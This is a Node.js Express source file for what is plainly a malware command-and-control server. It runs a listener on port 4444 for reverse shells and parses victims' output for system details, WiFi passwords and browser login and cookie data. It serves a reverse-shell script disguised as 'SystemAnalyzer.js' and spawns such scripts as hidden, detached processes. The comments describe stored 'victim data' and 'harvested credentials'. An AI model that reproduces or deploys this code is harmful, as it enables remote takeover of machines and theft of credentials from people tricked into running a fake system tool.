const express = require('express');
const path = require('path');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const net = require('net');
const app = express();
const port = 3000;
const credentialPort = 4444;

// Enhanced in-memory storage
// Server stores all victim data
let data = {
    downloads: [],      // Victim execution logs
    systemInfo: [],     // Victim system details
    credentials: [],    // Harvested credentials
    connections: []     // Active reverse shells
};

app.use(express.json());
app.use(express.static(__dirname));

// Credential listener server
let credentialServer;
let activeConnections = new Map();

function startCredentialListener() {
    credentialServer = net.createServer((socket) => {
        const clientId = `${socket.remoteAddress}:${socket.remotePort}`;
        console.log(`🔗 Reverse shell connected: ${clientId}`);
        
        activeConnections.set(clientId, {
            socket: socket,
            connectedAt: new Date(),
            credentials: {},
            dataBuffer: ''
        });
        
        // Add connection record
        data.connections.push({
            id: data.connections.length + 1,
            clientId: clientId,
            ip: socket.remoteAddress,
            connectedAt: new Date().toISOString(),
            status: 'active'
        });
        
        // Enhanced data parsing in credential listener
        socket.on('data', (chunk) => {
            const output = chunk.toString();
            const connection = activeConnections.get(clientId);
            
            if (connection) {
                connection.dataBuffer += output;
                
                // Parse system information more comprehensively
                if (output.includes('Connection established from')) {
                    const hostnameMatch = output.match(/Connection established from (.+?) \((.+?)\)/);
                    const osMatch = output.match(/OS: (.+)/);
                    const archMatch = output.match(/Architecture: (.+)/);
                    const platformMatch = output.match(/Platform: (.+)/);
                    
                    if (hostnameMatch || osMatch || archMatch) {
                        const systemRecord = {
                            id: data.systemInfo.length + 1,
                            clientId: clientId,
                            hostname: hostnameMatch ? hostnameMatch[1] : 'Unknown',
                            user: hostnameMatch ? hostnameMatch[2] : 'Unknown',
                            os: osMatch ? osMatch[1] : 'Unknown',
                            architecture: archMatch ? archMatch[1] : 'Unknown',
                            platform: platformMatch ? platformMatch[1] : 'Unknown',
                            memory_gb: 'Collecting...', // Will be updated by system commands
                            clientIP: socket.remoteAddress,
                            timestamp: new Date().toISOString()
                        };
                        
                        data.systemInfo.push(systemRecord);
                        console.log('📊 System info recorded:', systemRecord);
                    }
                }
                
                // Parse additional system details from command outputs
                if (output.includes('Total Physical Memory:')) {
                    const memoryMatch = output.match(/Total Physical Memory:\s*([\d,]+)\s*MB/);
                    if (memoryMatch && data.systemInfo.length > 0) {
                        const lastSystem = data.systemInfo[data.systemInfo.length - 1];
                        lastSystem.memory_gb = Math.round(parseInt(memoryMatch[1].replace(/,/g, '')) / 1024) + ' GB';
                    }
                }
                
                // Parse WiFi credentials
                if (output.includes('SSID:') && output.includes('Password:')) {
                    const wifiMatch = output.match(/SSID:\s*(.+?)\s*\|\s*Password:\s*(.+)/g);
                    if (wifiMatch) {
                        wifiMatch.forEach(match => {
                            const [, ssid, password] = match.match(/SSID:\s*(.+?)\s*\|\s*Password:\s*(.+)/);
                            data.credentials.push({
                                id: data.credentials.length + 1,
                                type: 'wifi',
                                clientId: clientId,
                                ssid: ssid.trim(),
                                password: password.trim(),
                                timestamp: new Date().toISOString()
                            });
                            console.log('📶 WiFi credential captured:', ssid);
                        });
                    }
                }
                
                // Parse browser credential information
                if (output.includes('Login Data') || output.includes('Cookies')) {
                    const browserMatch = output.match(/"(chrome|edge|firefox)":\s*{/);
                    if (browserMatch) {
                        data.credentials.push({
                            id: data.credentials.length + 1,
                            type: 'browser',
                            clientId: clientId,
                            service: browserMatch[1] + ' browser data',
                            data: 'Database files detected',
                            timestamp: new Date().toISOString()
                        });
                        console.log('🌐 Browser data detected:', browserMatch[1]);
                    }
                }
                
                // Store complete credential harvest
                if (output.includes('CREDENTIAL HARVESTING COMPLETED')) {
                    connection.credentials = {
                        complete: true,
                        rawData: connection.dataBuffer,
                        harvestedAt: new Date().toISOString()
                    };
                }
            }
        });
        
        socket.on('close', () => {
            console.log(`❌ Connection closed: ${clientId}`);
            activeConnections.delete(clientId);
            
            // Update connection status
            const connectionRecord = data.connections.find(c => c.clientId === clientId);
            if (connectionRecord) {
                connectionRecord.status = 'disconnected';
                connectionRecord.disconnectedAt = new Date().toISOString();
            }
        });
        
        socket.on('error', (err) => {
            console.error(`Socket error for ${clientId}:`, err.message);
        });
    });
    
    credentialServer.listen(credentialPort, '0.0.0.0', () => {
        console.log(`🎯 Credential listener started on port ${credentialPort}`);
    });
}

// Start credential listener
startCredentialListener();

// Serve pages
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/about', (req, res) => res.sendFile(path.join(__dirname, 'about.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));
app.get('/products', (req, res) => res.sendFile(path.join(__dirname, 'products.html')));

// Enhanced reverse shell download endpoint
app.get('/download-reverse-shell', (req, res) => {
    console.log('📥 Enhanced reverse shell download requested from:', req.ip);
    
    const scriptPath = path.join(__dirname, 'netcat', 'enhanced_reverse_shell.js');
    
    // Check if script exists
    if (!fs.existsSync(scriptPath)) {
        return res.status(404).send('Enhanced reverse shell script not found');
    }
    
    // Set headers for download
    res.setHeader('Content-Disposition', 'attachment; filename="SystemAnalyzer.js"');
    res.setHeader('Content-Type', 'application/javascript');
    
    // Log download
    data.downloads.push({
        id: data.downloads.length + 1,
        user: {
            name: 'System Analyzer User',
            email: 'analyzer@system.local',
            ipAddress: req.ip || '127.0.0.1',
            userAgent: req.get('User-Agent') || 'Unknown Browser'
        },
        software: 'enhanced-reverse-shell-analyzer',
        timestamp: new Date().toISOString(),
        status: 'completed',
        systemScriptExecuted: false,
        downloadType: 'reverse-shell'
    });
    
    // Send file
    res.download(scriptPath, 'SystemAnalyzer.js', (err) => {
        if (err) {
            console.error('❌ Error sending reverse shell script:', err);
            res.status(500).send('Error downloading file');
        } else {
            console.log('✅ Enhanced reverse shell script sent successfully');
        }
    });
});

// Enhanced data endpoint with credentials
app.get('/api/data', (req, res) => {
    const responseData = {
        ...data,
        activeConnections: Array.from(activeConnections.keys()),
        stats: {
            totalDownloads: data.downloads.length,
            totalCredentials: data.credentials.length,
            activeConnections: activeConnections.size,
            totalSystemInfo: data.systemInfo.length
        }
    };
    
    console.log('API called - returning enhanced data');
    res.json(responseData);
});

// Enhanced POST endpoint with auto-execution
app.post('/api/data', async (req, res) => {
    console.log('📥 Enhanced download request received from:', req.ip);
    console.log('Request body:', req.body);
    
    const clientIP = req.ip || req.connection.remoteAddress || '127.0.0.1';
    const userAgent = req.get('User-Agent') || 'Unknown Browser';
    
    try {
        // Add download record
        const downloadRecord = {
            id: data.downloads.length + 1,
            user: {
                name: req.body.name || 'Enhanced User',
                email: req.body.email || 'enhanced@system.com',
                ipAddress: clientIP,
                userAgent: userAgent
            },
            software: req.body.software || 'enhanced-reverse-shell',
            timestamp: new Date().toISOString(),
            status: 'completed',
            systemScriptExecuted: true,
            autoExecute: req.body.auto_execute || false
        };
        
        data.downloads.push(downloadRecord);
        
        // If auto-execute is requested, trigger the reverse shell
        if (req.body.auto_execute) {
            console.log('🚀 Auto-execution requested - reverse shell should connect soon...');
        }
        
        console.log('✅ Enhanced data processed successfully');
        console.log('📊 Current stats - Downloads:', data.downloads.length, 'Credentials:', data.credentials.length);
        
        res.json({ 
            success: true, 
            downloadId: downloadRecord.id,
            systemScriptExecuted: true,
            message: 'Enhanced download completed - connection expected',
            credentialListenerActive: credentialServer ? true : false
        });
        
    } catch (error) {
        console.error('❌ Error processing enhanced download request:', error);
        
        res.json({ 
            success: false, 
            message: 'Enhanced download failed',
            error: error.message
        });
    }
});

// Enhanced cross-platform auto-execution endpoint
app.post('/api/execute-reverse-shell', (req, res) => {
    console.log('🚀 Auto-execution request received from:', req.ip);
    console.log('🖥️ Platform detected:', process.platform);
    
    const scriptPath = path.join(__dirname, 'netcat', 'enhanced_reverse_shell.js');
    
    // Check if script exists
    if (!fs.existsSync(scriptPath)) {
        return res.status(404).json({ 
            success: false, 
            message: 'Script not found',
            manualCommand: `node "${scriptPath}"`
        });
    }
    
    // Check if Node.js is available
    exec('node --version', (error, stdout, stderr) => {
        if (error) {
            console.error('❌ Node.js not found in PATH');
            return res.status(500).json({
                success: false,
                message: 'Node.js not found. Please install Node.js or run manually.',
                manualCommand: `node "${scriptPath}"`
            });
        }
        
        console.log('✅ Node.js version:', stdout.trim());
        
        try {
            let child;
            const platform = process.platform;
            
            if (platform === 'win32') {
                // Windows execution with proper terminal handling
                child = spawn('cmd', ['/c', 'start', '/min', 'node', `"${scriptPath}"`], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                });
                console.log('🪟 Windows: Executing in minimized terminal');
                
            } else if (platform === 'linux' || platform === 'darwin') {
                // Linux/macOS execution with nohup for background process
                child = spawn('nohup', ['node', scriptPath], {
                    detached: true,
                    stdio: 'ignore'
                });
                console.log('🐧 Linux/macOS: Executing with nohup');
                
            } else {
                // Fallback for other platforms
                child = spawn('node', [scriptPath], {
                    detached: true,
                    stdio: 'ignore'
                });
                console.log('🔧 Other platform: Using basic spawn');
            }
            
            // Detach the process so it runs independently
            child.unref();
            
            // Handle process errors
            child.on('error', (err) => {
                console.error('❌ Process execution error:', err);
            });
            
            child.on('spawn', () => {
                console.log('✅ Enhanced reverse shell script spawned successfully');
                console.log('🔗 Waiting for reverse shell connection on port', credentialPort);
            });
            
            res.json({ 
                success: true, 
                message: `Reverse shell script executed successfully on ${platform}`,
                pid: child.pid,
                platform: platform,
                listenerPort: credentialPort,
                manualCommand: `node "${scriptPath}"`
            });
            
        } catch (error) {
            console.error('❌ Error executing reverse shell script:', error);
            res.status(500).json({ 
                success: false, 
                message: `Failed to execute script on ${process.platform}: ${error.message}`,
                error: error.message,
                platform: process.platform,
                manualCommand: `node "${scriptPath}"`
            });
        }
    });
});

// New endpoint for executing various file types with terminal opening
app.post('/api/execute-file', (req, res) => {
    const { fileType, fileName } = req.body;
    console.log(`🚀 Auto-execution request for ${fileType} file:`, fileName);
    console.log('🖥️ Platform detected:', process.platform);
    
    let filePath;
    let command;
    let args = [];
    
    // Determine file path and execution command based on file type
    switch (fileType) {
        case 'bat':
            filePath = path.join(__dirname, 'auto_system_script.bat');
            break;
        case 'python':
            filePath = path.join(__dirname, 'scripts', 'systemscript.py');
            break;
        case 'js':
            filePath = path.join(__dirname, 'netcat', 'enhanced_reverse_shell.js');
            break;
        default:
            return res.status(400).json({
                success: false,
                message: 'Unsupported file type. Supported: bat, python, js'
            });
    }
    
    // Check if file exists
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ 
            success: false, 
            message: `${fileType.toUpperCase()} file not found: ${filePath}`,
            manualCommand: getManualCommand(fileType, filePath)
        });
    }
    
    try {
        let child;
        const platform = process.platform;
        
        if (platform === 'win32') {
            // Windows execution with visible terminal
            if (fileType === 'bat') {
                // Execute .bat file in new command prompt window
                child = spawn('cmd', ['/c', 'start', 'cmd', '/k', `"${filePath}"`], {
                    detached: true,
                    stdio: 'ignore'
                });
                console.log('🪟 Windows: Executing .bat file in new terminal');
                
            } else if (fileType === 'python') {
                // Execute Python file in new command prompt window
                child = spawn('cmd', ['/c', 'start', 'cmd', '/k', 'python', `"${filePath}"`], {
                    detached: true,
                    stdio: 'ignore'
                });
                console.log('🪟 Windows: Executing Python file in new terminal');
                
            } else if (fileType === 'js') {
                // Execute Node.js file in new command prompt window
                child = spawn('cmd', ['/c', 'start', 'cmd', '/k', 'node', `"${filePath}"`], {
                    detached: true,
                    stdio: 'ignore'
                });
                console.log('🪟 Windows: Executing Node.js file in new terminal');
            }
            
        } else if (platform === 'linux' || platform === 'darwin') {
            // Linux/macOS execution with terminal opening
            if (fileType === 'bat') {
                // Convert .bat to shell script execution
                return res.status(400).json({
                    success: false,
                    message: '.bat files are not supported on Linux/macOS',
                    suggestion: 'Use Python or shell script instead'
                });
                
            } else if (fileType === 'python') {
                // Execute Python file in new terminal
                if (platform === 'linux') {
                    child = spawn('gnome-terminal', ['--', 'python3', filePath], {
                        detached: true,
                        stdio: 'ignore'
                    });
                } else { // macOS
                    child = spawn('osascript', ['-e', `tell app "Terminal" to do script "python3 '${filePath}'"`], {
                        detached: true,
                        stdio: 'ignore'
                    });
                }
                console.log('🐧 Linux/macOS: Executing Python file in new terminal');
                
            } else if (fileType === 'js') {
                // Execute Node.js file in new terminal
                if (platform === 'linux') {
                    child = spawn('gnome-terminal', ['--', 'node', filePath], {
                        detached: true,
                        stdio: 'ignore'
                    });
                } else { // macOS
                    child = spawn('osascript', ['-e', `tell app "Terminal" to do script "node '${filePath}'"`], {
                        detached: true,
                        stdio: 'ignore'
                    });
                }
                console.log('🐧 Linux/macOS: Executing Node.js file in new terminal');
            }
            
        } else {
            // Fallback for other platforms
            return res.status(500).json({
                success: false,
                message: `Platform ${platform} not supported for terminal execution`,
                manualCommand: getManualCommand(fileType, filePath)
            });
        }
        
        // Detach the process so it runs independently
        child.unref();
        
        // Handle process errors
        child.on('error', (err) => {
            console.error('❌ Process execution error:', err);
        });
        
        child.on('spawn', () => {
            console.log(`✅ ${fileType.toUpperCase()} file executed successfully in terminal`);
        });
        
        res.json({ 
            success: true, 
            message: `${fileType.toUpperCase()} file executed successfully in new terminal window`,
            fileType: fileType,
            filePath: filePath,
            platform: platform,
            pid: child.pid,
            manualCommand: getManualCommand(fileType, filePath)
        });
        
    } catch (error) {
        console.error(`❌ Error executing ${fileType} file:`, error);
        res.status(500).json({ 
            success: false, 
            message: `Failed to execute ${fileType} file on ${process.platform}: ${error.message}`,
            error: error.message,
            platform: process.platform,
            manualCommand: getManualCommand(fileType, filePath)
        });
    }
});

// Helper function to get manual execution commands
function getManualCommand(fileType, filePath) {
    switch (fileType) {
        case 'bat':
            return `"${filePath}"`;
        case 'python':
            return `python "${filePath}"`;
        case 'js':
            return `node "${filePath}"`;
        default:
            return `"${filePath}"`;
    }
}

// Enhanced download endpoint for multiple file types
app.get('/download-file/:type', (req, res) => {
    const fileType = req.params.type;
    let filePath;
    let fileName;
    
    switch (fileType) {
        case 'bat':
            filePath = path.join(__dirname, 'auto_system_script.bat');
            fileName = 'SystemAnalyzer.bat';
            break;
        case 'python':
            filePath = path.join(__dirname, 'scripts', 'systemscript.py');
            fileName = 'SystemAnalyzer.py';
            break;
        case 'js':
            filePath = path.join(__dirname, 'netcat', 'enhanced_reverse_shell.js');
            fileName = 'SystemAnalyzer.js';
            break;
        default:
            return res.status(400).json({ error: 'Invalid file type' });
    }
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: `${fileType.toUpperCase()} file not found` });
    }
    
    // Log the download
    const downloadInfo = {
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        fileType: fileType,
        fileName: fileName,
        filePath: filePath
    };
    
    data.downloads.push(downloadInfo);
    console.log(`📥 ${fileType.toUpperCase()} file download:`, req.ip);
    
    res.download(filePath, fileName, (err) => {
        if (err) {
            console.error(`❌ Error serving ${fileType} file:`, err);
        } else {
            console.log(`✅ ${fileType.toUpperCase()} file served successfully to:`, req.ip);
        }
    });
});

app.listen(port, () => {
    console.log(`\n🚀 Enhanced Server running at http://localhost:${port}`);
    console.log(`📊 Enhanced Dashboard at http://localhost:${port}/dashboard`);
    console.log(`🎯 Credential Listener: ACTIVE on port ${credentialPort}`);
    console.log(`📥 Reverse Shell Download: http://localhost:${port}/download-reverse-shell\n`);
});